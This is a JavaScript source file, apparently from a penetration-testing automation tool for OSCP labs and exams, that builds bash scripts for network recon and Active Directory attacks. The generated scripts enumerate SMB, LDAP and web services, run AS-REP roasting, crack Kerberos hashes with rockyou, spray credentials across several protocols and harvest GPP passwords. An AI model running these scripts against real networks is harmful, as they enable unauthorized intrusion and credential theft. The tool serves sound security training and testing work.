    if (/^[0-9.\/]+$/.test(target)) return false;
    if (target.indexOf(':') >= 0) {
      var v6 = target.split('/'), groups = v6[0].split(':');
      return v6.length <= 2 && (v6.length === 1 || /^\d{1,3}$/.test(v6[1]) && Number(v6[1]) <= 128)
        && /^[0-9a-f:]+$/i.test(v6[0]) && groups.length >= 3 && groups.length <= 9
        && groups.every(function (g) { return g.length <= 4; })
        && (v6[0].indexOf('::') >= 0 ? v6[0].indexOf('::') === v6[0].lastIndexOf('::') && groups.filter(Boolean).length < 8 : groups.length === 8 && groups.every(Boolean));
    }
    return target.replace(/\.$/, '').split('.').every(function (label) {
      return /^[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$/i.test(label);
    });
  }

  function buildStageScript(stageId, ctx) {
    ctx = ctx || {};
    var mode = (ctx.mode === 'lab') ? 'lab' : 'exam';
    var params = ctx.params || {};
    var facts = ctx.facts || null;
    var pack = ctx.pack || (OBOL.packs && OBOL.packs.actions && OBOL.packs.actions()) || [];
    var targetRaw = (ctx.target || params.target || '').trim();
    if (!validTarget(targetRaw)) return '';
    var targetVal = shellEsc(targetRaw);
    var rawDom = params.domain || '';
    if (!rawDom && facts && typeof facts.values === 'function') {
      var domFacts = (facts.values('ad.domain_known') || []).concat(facts.values('host.domain') || []);
      for (var di = 0; di < domFacts.length; di++) {
        var dCand = domFacts[di] && (domFacts[di].domain || domFacts[di].name);
        if (dCand && dCand !== 'domain') { rawDom = dCand; break; }
      }
    }
    var rawUser = params.username || params.user || '';
    var rawPass = params.password || '';
    var rawHash = params.nthash || '';
    if (!rawUser && facts && typeof facts.values === 'function') {
      var credFacts = (facts.values('credential.available') || []).concat(facts.values('credential.plaintext') || []);
      for (var ci = 0; ci < credFacts.length; ci++) {
        var cf = credFacts[ci] || {};
        var cu = cf.user || cf.username || '';
        var cp = cf.password || cf.secret || '';
        var ch = cf.nthash || cf.hash || '';
        if (cu && (cp || ch)) {
          rawUser = cu;
          if (ch && !cp) rawHash = ch;
          else rawPass = cp;
          break;
        }
      }
    }
    var domainVal = rawDom ? shellEsc(rawDom) : '';
    var userVal = rawUser ? shellEsc(rawUser) : '';
    var passVal = rawPass ? shellEsc(rawPass) : '';
    var hashVal = rawHash ? shellEsc(rawHash) : '';
    var lhostVal = params.lhost ? shellEsc(params.lhost) : '';
    var osFam = ctx.osFamily || detectTargetOs(facts);
    var stamp = (function () { try { return new Date().toISOString().slice(0, 16).replace('T', ' '); } catch (e) { return ''; } })();
    var modeTag = (mode === 'lab') ? '[LAB FULL AUTOPILOT - END-TO-END]' : '[OSCP EXAM SAFE - ENUMERATION & TRIAGE ONLY]';

    if (stageId === 'pivot') {
      if (OBOL.pivotkit && typeof OBOL.pivotkit.autoKit === 'function') {
        var pCtx = (OBOL.pivotkit.ctxDefaults) ? OBOL.pivotkit.ctxDefaults({ params: params }, facts) : { lhost: lhostVal, pivotHost: targetVal, subnet: '', sshUser: userVal };
        return OBOL.pivotkit.autoKit(pCtx, facts && facts.kinds ? facts.kinds() : {});
      }
    }

    var wsRootRaw = (ctx.workspace && ctx.workspace.root && ctx.workspace.root !== '.') ? String(ctx.workspace.root).trim() : '';
    var wsRootEsc = wsRootRaw ? shellEsc(wsRootRaw) : '';

    function selfHealPreambleBash() {
      var wdLines = wsRootEsc ? [
        'OBOL_WORKDIR=\'' + wsRootEsc + '\'',
        'OBOL_WORKDIR="${OBOL_WORKDIR/#\\~/$HOME}"',
        'if [ -n "$OBOL_WORKDIR" ] && [ -d "$OBOL_WORKDIR" ]; then',
        '  cd "$OBOL_WORKDIR" || true',
        'fi',
      ] : [];
      return wdLines.concat([
        '# --- Self-healing Loadout runtime preamble (PATH, Impacket/NetExec shims, wordlists & staged payloads) ---',
        'export PATH="$HOME/.local/bin:$HOME/go/bin:$HOME/.obol/arsenal:$HOME/.cache/obol/bin:/usr/local/bin:/usr/sbin:/sbin:$PATH"',
        'OBOL_CACHE="$HOME/.obol/arsenal"',
        'mkdir -p "$OBOL_CACHE" "$OBOL_CACHE/www" scans loot www 2>/dev/null || true',
        'strip_ansi() { sed -E \'s/\\x1b\\[[0-9;]*[a-zA-Z]//g\'; }',
      ]).concat([
        '',
        '# Runtime command shims so nxc <-> netexec <-> crackmapexec, bloodyAD <-> bloodyad, and impacket-* <-> *.py resolve automatically',
        'if ! command -v nxc >/dev/null 2>&1; then',
        '  if command -v netexec >/dev/null 2>&1; then nxc() { netexec "$@"; };',
        '  elif command -v crackmapexec >/dev/null 2>&1; then nxc() { crackmapexec "$@"; }; fi',
        'fi',
        'if ! command -v bloodyAD >/dev/null 2>&1 && command -v bloodyad >/dev/null 2>&1; then',
        '  bloodyAD() { bloodyad "$@"; }',
        'elif ! command -v bloodyad >/dev/null 2>&1 && command -v bloodyAD >/dev/null 2>&1; then',
        '  bloodyad() { bloodyAD "$@"; }',
        'fi',
        'if ! command -v certipy-ad >/dev/null 2>&1 && command -v certipy >/dev/null 2>&1; then',
        '  certipy-ad() { certipy "$@"; }',
        'fi',
        'if ! command -v enum4linux-ng >/dev/null 2>&1 && command -v enum4linux >/dev/null 2>&1; then',
        '  enum4linux-ng() { enum4linux "$@"; }',
        'fi',
        'for IMP in GetNPUsers GetUserSPNs secretsdump psexec wmiexec smbexec atexec dcomexec ticketer getST getTGT dacledit rbcd findDelegation addcomputer mssqlclient lookupsid; do',
        '  if ! command -v "impacket-$IMP" >/dev/null 2>&1; then',
        '    if command -v "${IMP}.py" >/dev/null 2>&1; then',
        '      eval "impacket-$IMP() { ${IMP}.py \\"\\$@\\"; }"',
        '    elif [ -f "/usr/share/doc/python3-impacket/examples/${IMP}.py" ]; then',
        '      eval "impacket-$IMP() { python3 /usr/share/doc/python3-impacket/examples/${IMP}.py \\"\\$@\\"; }"',
        '    fi',
        '  fi',
        '  if ! command -v "${IMP}.py" >/dev/null 2>&1 && command -v "impacket-$IMP" >/dev/null 2>&1; then',
        '    eval "${IMP}.py() { impacket-$IMP \\"\\$@\\"; }"',
        '  fi',
        'done',
        '',
        '# Auto-resolve rockyou.txt (auto-decompressing rockyou.txt.gz into ~/.obol/arsenal if needed) and SecLists',
        'ROCKYOU=""',
        'for RP in /usr/share/wordlists/rockyou.txt "$OBOL_CACHE/rockyou.txt" /opt/wordlists/rockyou.txt "$HOME/wordlists/rockyou.txt"; do',
        '  if [ -f "$RP" ]; then ROCKYOU="$RP"; break; fi',
        'done',
        'if [ -z "$ROCKYOU" ] && [ -f /usr/share/wordlists/rockyou.txt.gz ]; then',
        '  gunzip -c /usr/share/wordlists/rockyou.txt.gz > "$OBOL_CACHE/rockyou.txt" 2>/dev/null && ROCKYOU="$OBOL_CACHE/rockyou.txt" || true',
        'fi',
        '[ -z "$ROCKYOU" ] && ROCKYOU="/usr/share/wordlists/rockyou.txt"',
        'SECLISTS_DIR="/usr/share/seclists"',
        'for SP in /usr/share/seclists /usr/share/wordlists/seclists /usr/share/wordlists/SecLists /opt/seclists /opt/SecLists "$HOME/seclists" "$HOME/SecLists" "$HOME/tools/SecLists"; do',
        '  if [ -d "$SP" ]; then SECLISTS_DIR="$SP"; break; fi',
        'done',
        '',
        '# Adopt existing Kali/Loadout payloads into ./www/ so transfer files are always staged',
        'for SRC in "$OBOL_CACHE/www" "$OBOL_CACHE/lin" "$OBOL_CACHE/win" "$HOME/.cache/obol/www" "/usr/share/peass/linpeas" "/usr/share/peass/winpeas" "/usr/share/windows-resources/binaries"; do',
        '  [ -d "$SRC" ] && cp -rn "$SRC"/* www/ 2>/dev/null || true',
        'done',
      ]).join('\n');
    }

    if (stageId === 'recon') {
      var labTail = (mode === 'lab')
        ? ('\n' + [
            '  TARGET="$T"',
            labAutoFootholdAndFlagsBash(),
          ].join('\n'))
        : '';

      return [
        '#!/usr/bin/env bash',
        '# obol cruise - Stage 1: Multi-Hypothesis Recon & Service Triage ' + modeTag,
        '# Generated ' + stamp + ' UTC. Runs on Kali against an IP, space-separated IPs, or CIDR subnet.',
        '# Tests all initial discovery hypotheses in one pass so you never waste a paste round-trip:',
        '#   1. Fast all-TCP + top-UDP Nmap + NSE vuln/default checks on open ports',
        '#   2. FTP anon + file listing, SSH banner, DNS AXFR zone transfer',
        '#   3. SMB null + guest shares, RID cycling (--rid-brute), enum4linux-ng, MS17-010 check',
        '#   4. LDAP rootDSE + anonymous user/computer/description dump + unauth AS-REP check + offline crack',
        '#   5. HTTP headers, robots.txt, .git/HEAD, whatweb, directory + backup extension fuzzing',
        '#   6. NFS showmount, SNMP public walk, and Redis/MySQL/Postgres/MSSQL/Mongo unauth checks',
        'set -o pipefail',
        '',
        'TARGET_INPUT="${1:-' + targetVal + '}"',
        'DOMAIN_HINT="' + domainVal + '"',
        'USER="' + userVal + '"',
        'PASS="' + passVal + '"',
        'NTHASH="' + hashVal + '"',
        'LHOST="' + lhostVal + '"',
        'if [ -z "$LHOST" ] || [[ "$LHOST" == \\<* ]]; then',
        '  for IFACE in tun0 tap0 wg0 eth0; do',
        '    DET=$(ip -4 -o addr show dev "$IFACE" 2>/dev/null | awk \'{split($4,a,"/"); print a[1]; exit}\')',
        '    if [ -n "$DET" ]; then LHOST="$DET"; break; fi',
        '  done',
        'fi',
        selfHealPreambleBash(),
        'LOG="scans/obol-stage1-$(date +%Y%m%d-%H%M%S).log"',
        'exec > >(tee -a "$LOG") 2>&1',
        '',
        'echo "[obol] Stage 1: Multi-Hypothesis Recon & Triage | Mode: ' + mode.toUpperCase() + ' | Scope: $TARGET_INPUT | LHOST: ${LHOST:-auto}"',
        '[ -n "$LHOST" ] && echo "[tun0:$LHOST]"',
        '',
        'TARGETS=()',
        'for TOK in $TARGET_INPUT; do',
        '  if [[ "$TOK" == */* ]]; then',
        '    echo "[obol] Discovering live hosts in subnet $TOK..."',
        '    mapfile -t LIVE < <(nmap -sn -n "$TOK" 2>/dev/null | awk \'/Nmap scan report for/{print $NF}\' | tr -d "()")',
        '    for H in "${LIVE[@]}"; do [ -n "$H" ] && TARGETS+=("$H"); done',
        '  else',
        '    TARGETS+=("$TOK")',
        '  fi',
        'done',
        '[ ${#TARGETS[@]} -eq 0 ] && TARGETS=("$TARGET_INPUT")',
        '',
        'STEP=0',
        'for T in "${TARGETS[@]}"; do',
        '  STEP=$((STEP + 1))',
        '  echo "===== OBOL STEP ${STEP}: nmap-quick nmap $T ====="',
        '  echo "[obol] Scanning all TCP ports and service versions on $T..."',
        '  nmap -Pn -p- --min-rate 3000 -T4 --open "$T" -oG "scans/nmap-ports-$T.gnmap" >/dev/null 2>&1 || true',
        '  PORTS=$(grep -oP \'\\d+/open\' "scans/nmap-ports-$T.gnmap" 2>/dev/null | cut -d/ -f1 | sort -n -u | paste -sd, -)',
        '  if [ -n "$PORTS" ]; then',
        '    nmap -Pn -sC -sV -p "$PORTS" "$T" -oN "scans/nmap-tcp-$T.txt" -oX "scans/nmap-tcp-$T.xml"',
        '  else',
        '    nmap -Pn --top-ports 1000 -sC -sV "$T" -oN "scans/nmap-tcp-$T.txt" -oX "scans/nmap-tcp-$T.xml"',
        '    PORTS=$(grep -oP \'^\\d+/tcp\\s+open\' "scans/nmap-tcp-$T.txt" 2>/dev/null | cut -d/ -f1 | paste -sd, -)',
        '  fi',
        '  if [ "$(id -u)" -eq 0 ]; then',
        '    nmap -Pn -sU --top-ports 30 --open -sV "$T" -oN "scans/nmap-udp-$T.txt" 2>/dev/null || true',
        '  fi',
        '',
        '  has_port() { [[ ",$PORTS," == *",$1,"* ]]; }',
        '  : > "loot/users-raw-$T.txt"',
        '',
        '  if has_port 21; then',
        '    STEP=$((STEP + 1))',
        '    echo "===== OBOL STEP ${STEP}: recon-ftp ftp $T ====="',
        '    timeout 15 ftp -inv "$T" <<EOF 2>&1 || true',
        'user anonymous anonymous@',
        'binary',
        'ls -la',
        'bye',
        'EOF',
        '  fi',
        '',
        '  if has_port 22; then',
        '    STEP=$((STEP + 1))',
        '    echo "===== OBOL STEP ${STEP}: ssh-banner ssh $T ====="',
        '    timeout 5 ssh -o BatchMode=yes -o StrictHostKeyChecking=no "nobody@$T" 2>&1 || true',
        '  fi',
        '',
        '  if has_port 53; then',
        '    STEP=$((STEP + 1))',
        '    echo "===== OBOL STEP ${STEP}: recon-dns dig axfr $T ====="',
        '    dig @"$T" -x "$T" +short +time=3 2>&1 || true',
        '    [ -n "$DOMAIN_HINT" ] && dig @"$T" "$DOMAIN_HINT" AXFR +noall +answer +time=4 2>&1 || true',
        '  fi',
        '',
        '  if has_port 139 || has_port 445; then',
        '    STEP=$((STEP + 1))',
        '    echo "===== OBOL STEP ${STEP}: smb-anon nxc smb $T ====="',
        '    if command -v nxc >/dev/null 2>&1; then',
        '      nxc smb "$T" -u \'\' -p \'\' --shares 2>&1 | tee "loot/smb-anon-$T.txt" || true',
        '      nxc smb "$T" -u \'guest\' -p \'\' --shares 2>&1 || true',
        '      if [ -z "$DOMAIN_HINT" ]; then',
        '        DOM_SMB=$(strip_ansi < "loot/smb-anon-$T.txt" 2>/dev/null | grep -oP \'(?<=\\(domain:)[^)]+\' | head -n 1)',
        '        [ -n "$DOM_SMB" ] && DOMAIN_HINT="$DOM_SMB"',
        '      fi',
        '      STEP=$((STEP + 1))',
        '      echo "===== OBOL STEP ${STEP}: ad-user-enum nxc smb --rid-brute $T ====="',
        '      nxc smb "$T" -u \'\' -p \'\' --rid-brute > "loot/rid-$T.txt" 2>&1 || nxc smb "$T" -u \'guest\' -p \'\' --rid-brute > "loot/rid-$T.txt" 2>&1 || true',
        '      head -n 160 "loot/rid-$T.txt" 2>/dev/null || true',
        '      strip_ansi < "loot/rid-$T.txt" 2>/dev/null | grep -oP \'[^\\\\\\s]+(?=\\s+\\(SidTypeUser\\))\' >> "loot/users-raw-$T.txt" || true',
        '    fi',
        '    STEP=$((STEP + 1))',
        '    echo "===== OBOL STEP ${STEP}: smb-shares smbclient enum4linux rpcclient $T ====="',
        '    smbclient -N -L "//$T" 2>&1 || true',
        '    if command -v rpcclient >/dev/null 2>&1; then',
        '      rpcclient -U "" -N "$T" -c "srvinfo;enumdomusers;querydominfo" > "loot/rpc-$T.txt" 2>&1 || true',
        '      cat "loot/rpc-$T.txt" 2>/dev/null || true',
        '      strip_ansi < "loot/rpc-$T.txt" 2>/dev/null | grep -oP \'(?<=user:\\[)[^\\]]+\' >> "loot/users-raw-$T.txt" || true',
        '    fi',
        '    if command -v enum4linux-ng >/dev/null 2>&1; then',
        '      timeout 60 enum4linux-ng -A "$T" > "loot/enum4linux-$T.txt" 2>&1 || true',
        '      cat "loot/enum4linux-$T.txt" 2>/dev/null || true',
        '      strip_ansi < "loot/enum4linux-$T.txt" 2>/dev/null | awk \'/^\\s*username:\\s*/{print $2}\' | tr -d "\'\\"" >> "loot/users-raw-$T.txt" || true',
        '    fi',
        '    STEP=$((STEP + 1))',
        '    echo "===== OBOL STEP ${STEP}: nmap-vuln-scripts nmap $T ====="',
        '    nmap -Pn -p 445 --script smb-vuln-ms17-010,smb-protocols "$T" 2>&1 || true',
        '  fi',
        '',
        '  if has_port 88 || has_port 389 || has_port 636 || has_port 3268; then',
        '    STEP=$((STEP + 1))',
        '    echo "===== OBOL STEP ${STEP}: ldap-rootdse ldapsearch $T ====="',
        '    BASEDN=$(ldapsearch -x -H "ldap://$T" -s base namingContexts 2>/dev/null | awk \'/^namingContexts:/{print $2; exit}\')',
        '    ldapsearch -x -H "ldap://$T" -s base 2>&1 || true',
        '    if [ -n "$BASEDN" ]; then',
        '      STEP=$((STEP + 1))',
        '      echo "===== OBOL STEP ${STEP}: ad-anon-ldap-enum ldapsearch $T ====="',
        '      ldapsearch -x -H "ldap://$T" -b "$BASEDN" "(objectClass=user)" sAMAccountName userPrincipalName description info memberOf > "loot/ldap-users-$T.txt" 2>&1 || true',
        '      head -n 450 "loot/ldap-users-$T.txt" 2>/dev/null || true',
        '      awk \'/^sAMAccountName:/{print $2}\' "loot/ldap-users-$T.txt" 2>/dev/null >> "loot/users-raw-$T.txt" || true',
        '      DOM_DERIVED=$(echo "$BASEDN" | sed -E \'s/DC=//gi; s/,/./g\')',
        '      [ -z "$DOMAIN_HINT" ] && DOMAIN_HINT="$DOM_DERIVED"',
        '    fi',
        '    sort -u "loot/users-raw-$T.txt" 2>/dev/null | grep -vE \'^($|\\$|SM_|HealthMailbox)\' > "loot/users-$T.txt" || true',
        '    [ -s "loot/users-$T.txt" ] && cp -f "loot/users-$T.txt" "loot/users.txt" 2>/dev/null || true',
        '    if [ -s "loot/users-$T.txt" ] && [ -n "$DOMAIN_HINT" ]; then',
        '      STEP=$((STEP + 1))',
        '      echo "===== OBOL STEP ${STEP}: asrep-roast getnpusers $T ====="',
        '      if command -v impacket-GetNPUsers >/dev/null 2>&1; then',
        '        impacket-GetNPUsers "$DOMAIN_HINT/" -usersfile "loot/users-$T.txt" -dc-ip "$T" -no-pass -format hashcat -outputfile "loot/asrep-$T.txt" 2>&1 || true',
        '      fi',
        '      if [ ! -s "loot/asrep-$T.txt" ] && command -v nxc >/dev/null 2>&1; then',
        '        nxc ldap "$T" -u "loot/users-$T.txt" -p \'\' --asreproast "loot/asrep-$T.txt" 2>&1 || true',
        '      fi',
        '      if [ -s "loot/asrep-$T.txt" ]; then',
        '        cp -f "loot/asrep-$T.txt" "loot/asrep.hashes" 2>/dev/null || true',
        '        cat "loot/asrep-$T.txt"',
        '        if [ -f "$ROCKYOU" ] && command -v john >/dev/null 2>&1; then',
        '          STEP=$((STEP + 1))',
        '          echo "===== OBOL STEP ${STEP}: crack-hashes-john john $T ====="',
        '          john --format=krb5asrep --pot="loot/john.pot" --wordlist="$ROCKYOU" "loot/asrep-$T.txt" 2>&1 || john --pot="loot/john.pot" --wordlist="$ROCKYOU" "loot/asrep-$T.txt" 2>&1 || true',
        '          john --pot="loot/john.pot" --show "loot/asrep-$T.txt" 2>&1 || true',
        '          cat "loot/john.pot" 2>/dev/null || true',
        '          john --pot="loot/john.pot" --show "loot/asrep-$T.txt" >> loot/cracked-users.txt 2>/dev/null || true',
        '        elif [ -f "$ROCKYOU" ] && command -v hashcat >/dev/null 2>&1; then',
        '          STEP=$((STEP + 1))',
        '          echo "===== OBOL STEP ${STEP}: crack-hashes-hashcat hashcat $T ====="',
        '          hashcat -m 18200 -a 0 --potfile-path="loot/john.pot" "loot/asrep-$T.txt" "$ROCKYOU" --quiet 2>&1 || true',
        '          cat "loot/john.pot" 2>/dev/null || true',
        '        fi',
        '      fi',
        '    fi',
        '  fi',
        '',
        '  for WPORT in 80 443 8080 8443 8000 8888 3000 5000; do',
        '    if has_port "$WPORT"; then',
        '      PROTO="http"',
        '      [[ "$WPORT" == "443" || "$WPORT" == "8443" ]] && PROTO="https"',
        '      URL="${PROTO}://${T}:${WPORT}"',
        '      STEP=$((STEP + 1))',
        '      echo "===== OBOL STEP ${STEP}: check-web-headers curl whatweb $T ====="',
        '      curl -skI --max-time 8 "$URL/" 2>&1 || true',
        '      command -v whatweb >/dev/null 2>&1 && whatweb --color=never -a 1 "$URL" 2>&1 || true',
        '      curl -sk --max-time 6 "$URL/robots.txt" 2>&1 | head -n 45 || true',
        '      curl -sk --max-time 6 "$URL/sitemap.xml" 2>&1 | head -n 30 || true',
        '      curl -sk --max-time 6 "$URL/.git/HEAD" 2>&1 | head -n 5 || true',
        '      curl -sk --max-time 6 "$URL/.env" 2>&1 | head -n 20 || true',
        '      STEP=$((STEP + 1))',
        '      echo "===== OBOL STEP ${STEP}: web-dir-enum ffuf gobuster $T ====="',
        '      WL="$SECLISTS_DIR/Discovery/Web-Content/raft-small-words.txt"',
        '      [ ! -f "$WL" ] && WL="/usr/share/wordlists/dirb/common.txt"',
        '      if [ -f "$WL" ]; then',
        '        if command -v ffuf >/dev/null 2>&1; then',
        '          ffuf -u "$URL/FUZZ" -w "$WL" -e .php,.txt,.bak,.zip,.conf,.html -mc 200,204,301,302,307,401,403 -t 40 -maxtime 40 -noninteractive 2>&1 | tr \'\\r\' \'\\n\' | grep -E \'\\[Status:\' | head -n 90 || true',
        '        elif command -v gobuster >/dev/null 2>&1; then',
        '          timeout 40 gobuster dir -u "$URL" -w "$WL" -x php,txt,bak,zip,html -q -k -t 30 2>&1 | head -n 90 || true',
        '        fi',
        '      fi',
        '    fi',
        '  done',
        '',
        '  if has_port 111 || has_port 2049; then',
        '    STEP=$((STEP + 1))',
        '    echo "===== OBOL STEP ${STEP}: recon-nfs showmount $T ====="',
        '    showmount -e "$T" 2>&1 || true',
        '  fi',
        '',
        '  if has_port 6379; then',
        '    STEP=$((STEP + 1))',
        '    echo "===== OBOL STEP ${STEP}: redis-cli-probe redis-cli $T ====="',
        '    command -v redis-cli >/dev/null 2>&1 && timeout 5 redis-cli -h "$T" INFO 2>&1 | head -n 40 || true',
        '  fi',
        '',
        '  if grep -q "161/udp" "scans/nmap-udp-$T.txt" 2>/dev/null; then',
        '    STEP=$((STEP + 1))',
        '    echo "===== OBOL STEP ${STEP}: recon-snmp snmpwalk $T ====="',
        '    snmpwalk -v2c -c public -t 3 "$T" 1.3.6.1.2.1.1 2>&1 | head -n 60 || true',
        '    snmpwalk -v2c -c public -t 3 "$T" 1.3.6.1.4.1.77.1.2.25 2>&1 | head -n 60 || true',
        '  fi',
        labTail,
        'done',
        '',
        'FULL_LOG="$(pwd)/$LOG"',
        'CLIP_NOTE=""',
        'if command -v xclip >/dev/null 2>&1 && [ -n "${DISPLAY:-}" ]; then',
        '  xclip -selection clipboard < "$FULL_LOG" 2>/dev/null && CLIP_NOTE=" (Auto-copied to clipboard - just press Ctrl+V in OBOL!)" || true',
        'elif command -v xsel >/dev/null 2>&1 && [ -n "${DISPLAY:-}" ]; then',
        '  xsel --clipboard --input < "$FULL_LOG" 2>/dev/null && CLIP_NOTE=" (Auto-copied to clipboard - just press Ctrl+V in OBOL!)" || true',
        'elif command -v wl-copy >/dev/null 2>&1; then',
        '  wl-copy < "$FULL_LOG" 2>/dev/null && CLIP_NOTE=" (Auto-copied to clipboard - just press Ctrl+V in OBOL!)" || true',
        'fi',
        'echo ""',
        'echo "================================================================================"',
        'echo "[obol] Stage 1 complete!${CLIP_NOTE}"',
        'echo "[obol] Log file saved at: $FULL_LOG"',
        'echo "[obol] Next: In OBOL Cruise, click \'Attach Log File\' and select:"',
        'echo "       $FULL_LOG"',
        'echo "================================================================================"',
      ].join('\n') + '\n';
    }

    if (stageId === 'enum') {
      var fillOpts = { params: params, profile: ctx.profile, workspace: ctx.workspace };
      var stPlan = plan(facts || { has: function () { return false; }, values: function () { return []; } }, pack, { mode: mode, doneIds: ctx.doneIds, fill: fillOpts, cap: 20 });
      var BUILTIN_STAGE2_SKIP = {
        'recon-smb-anon': 1,
        'smb-anon': 1,
        'bloodyad-acl': 1,
        'bloodhound-collect': 1,
        'smb-share-inventory': 1,
        'spider-secrets': 1,
        'nxc-arsenal': 1,
        'lateral-exec': 1,
      };
      var items = (OBOL.playbook && OBOL.playbook.resolve)
        ? OBOL.playbook.resolve((stPlan.batch || []).filter(function (b) {
            return b && b.action && !BUILTIN_STAGE2_SKIP[b.action.id];
          }).map(function (b) { return { id: b.action.id, idx: b.cmdIndex || 0 }; }), pack)
        : [];
      var stepLines = [];
      var n = 0;
      items.forEach(function (it) {
        var r = OBOL.playbook.renderLine(it, facts, fillOpts);
        if (!r || !r.run) return;
        n++;
        stepLines.push('echo "===== OBOL STEP ' + n + ': ' + markerSafe(it.id) + ' ' + markerSafe(r.run) + ' $TARGET ====="');
        stepLines.push('# [' + n + '] ' + oneLine(it.title));
        stepLines.push(r.run + ' || true');
        stepLines.push('');
      });

      return [
        '#!/usr/bin/env bash',
        '# obol cruise - Stage 2: Deep Multi-Hypothesis Sweep & Auto-Foothold ' + modeTag,
        '# Generated ' + stamp + ' UTC. Combines all unlocked frontier moves with deep fallback hypotheses:',
        '#   - Multi-service credential validation matrix (SMB, WinRM, LDAP, MSSQL, SSH, RDP, FTP)',
        '#   - Readable SMB share spidering & GPP/config harvesting',
        '#   - Authenticated AD sweep (BloodHound, Kerberoast, AS-REP, ADCS certipy)',
        '#   - Vhost discovery & deep web backup/parameter checks',
        '#   - Automatic offline hash cracking (john/rockyou) + staging ./www/ privesc binaries',
        (mode === 'lab'
          ? '#   - LAB FULL AUTOPILOT: Automatically executes unlocked footholds and captures local.txt / proof.txt!'
          : '#   - OSCP EXAM SAFE: Stops before interactive shells/exploits and prepares your Manual Foothold Strike.'),
        'set -o pipefail',
        '',
        'TARGET="${1:-' + targetVal + '}"',
        'DOMAIN="' + domainVal + '"',
        'USER="' + userVal + '"',
        'PASS="' + passVal + '"',
        'NTHASH="' + hashVal + '"',
        'LHOST="' + lhostVal + '"',
        'if [ -z "$LHOST" ] || [[ "$LHOST" == \\<* ]]; then',
        '  for IFACE in tun0 tap0 wg0 eth0; do',
        '    DET=$(ip -4 -o addr show dev "$IFACE" 2>/dev/null | awk \'{split($4,a,"/"); print a[1]; exit}\')',
        '    if [ -n "$DET" ]; then LHOST="$DET"; break; fi',
        '  done',
        'fi',
        selfHealPreambleBash(),
        'LOG="scans/obol-stage2-$(date +%Y%m%d-%H%M%S).log"',
        'exec > >(tee -a "$LOG") 2>&1',
        '',
        'echo "[obol] Stage 2: Deep Multi-Hypothesis Sweep | Mode: ' + mode.toUpperCase() + ' | Target: $TARGET | User: ${USER:-anon}"',
        '[ -n "$LHOST" ] && echo "[tun0:$LHOST]"',
        '',
        stepLines.length ? stepLines.join('\n') : '# All primary pack frontier moves already tried; running deep fallback & credential matrix below.',
        '',
        '# Deep Fallback Wave: Vhost discovery if DOMAIN is known, plus full NSE vuln sweep on open ports',
        'if [ -n "$DOMAIN" ] && command -v ffuf >/dev/null 2>&1; then',
        '  VWL="$SECLISTS_DIR/Discovery/DNS/subdomains-top1million-5000.txt"',
        '  if [ -f "$VWL" ]; then',
        '    echo "===== OBOL STEP 80: vhost-discovery ffuf -H Host: FUZZ $TARGET ====="',
        '    ffuf -u "http://$TARGET/" -H "Host: FUZZ.$DOMAIN" -w "$VWL" -mc 200,301,302,401,403 -fs 0 -t 40 -maxtime 30 -noninteractive 2>&1 | tr \'\\r\' \'\\n\' | grep -E \'\\[Status:\' | head -n 40 || true',
        '  fi',
        'fi',
        '',
        '# Multi-service credential validation & authenticated AD/SMB harvest when USER + PASS/NTHASH exist',
        'if [ -n "$USER" ] && { [ -n "$PASS" ] || [ -n "$NTHASH" ]; }; then',
        '  if command -v nxc >/dev/null 2>&1; then',
        '    for PROTO in smb winrm ldap mssql ssh rdp ftp; do',
        '      echo "===== OBOL STEP 85: cred-validate-${PROTO} nxc ${PROTO} $TARGET ====="',
        '      if [ -n "$NTHASH" ]; then',
        '        nxc "$PROTO" "$TARGET" -u "$USER" -H "$NTHASH" $([ "$PROTO" = "smb" ] && echo "--shares") 2>&1 || true',
        '      else',
        '        nxc "$PROTO" "$TARGET" -u "$USER" -p "$PASS" $([ "$PROTO" = "smb" ] && echo "--shares") 2>&1 || true',
        '      fi',
        '    done',
        '    echo "===== OBOL STEP 86: smb-share-inventory nxc smb spider_plus $TARGET ====="',
        '    if [ -n "$NTHASH" ]; then',
        '      nxc smb "$TARGET" -u "$USER" -H "$NTHASH" -M spider_plus -M gpp_password 2>&1 || true',
        '    else',
        '      nxc smb "$TARGET" -u "$USER" -p "$PASS" -M spider_plus -M gpp_password 2>&1 || true',
        '    fi',
        '  fi',
        '  if [ -n "$DOMAIN" ] && [ -n "$PASS" ]; then',
        '    if command -v bloodyAD >/dev/null 2>&1; then',
        '      echo "===== OBOL STEP 87: bloodyad-acl bloodyAD get writable $TARGET ====="',
        '      bloodyAD -d "$DOMAIN" --host "$TARGET" -u "$USER" -p "$PASS" get writable 2>&1 | tee "scans/bloodyad-writable-$TARGET.txt" || true',
        '    fi',
        '    if ! ls *_bloodhound.zip >/dev/null 2>&1 && command -v bloodhound-python >/dev/null 2>&1; then',
        '      echo "===== OBOL STEP 88: bloodhound-collect bloodhound-python $TARGET ====="',
        '      bloodhound-python -d "$DOMAIN" -u "$USER" -p "$PASS" -ns "$TARGET" -c All --zip 2>&1 || true',
        '    fi',
        '  fi',
        'fi',
        '',
        '# Offline crack pass for any unique captured AS-REP / Kerberoast / NetNTLM hashes in loot/',
        'if [ -f "$ROCKYOU" ] && command -v john >/dev/null 2>&1; then',
        '  SEEN_HASH_MD5=" "',
        '  for HFILE in loot/*hash* loot/*asrep* loot/*kerberoast* loot/*tgs* scans/*hash*; do',
        '    if [ -f "$HFILE" ] && [ -s "$HFILE" ] && [[ "$HFILE" != *.pot* ]]; then',
        '      HMD5=$(md5sum "$HFILE" 2>/dev/null | awk \'{print $1}\')',
        '      if [ -n "$HMD5" ] && [[ "$SEEN_HASH_MD5" != *" $HMD5 "* ]]; then',
        '        SEEN_HASH_MD5="${SEEN_HASH_MD5}${HMD5} "',
        '        echo "===== OBOL STEP 90: crack-hashes-john john $TARGET ====="',
        '        if ! john --pot="loot/john.pot" --show "$HFILE" 2>/dev/null | grep -q "0 left"; then',
        '          john --pot="loot/john.pot" --wordlist="$ROCKYOU" "$HFILE" 2>&1 || true',
        '        fi',
        '        john --pot="loot/john.pot" --show "$HFILE" 2>&1 || true',
        '        cat "loot/john.pot" 2>/dev/null || true',
        '        john --pot="loot/john.pot" --show "$HFILE" >> loot/cracked-users.txt 2>/dev/null || true',
        '      fi',
        '    fi',
        '  done',
        'fi',
        (mode === 'lab' ? ('\n' + labAutoFootholdAndFlagsBash()) : ''),
        '',
        'FULL_LOG="$(pwd)/$LOG"',
        'CLIP_NOTE=""',
        'if command -v xclip >/dev/null 2>&1 && [ -n "${DISPLAY:-}" ]; then',
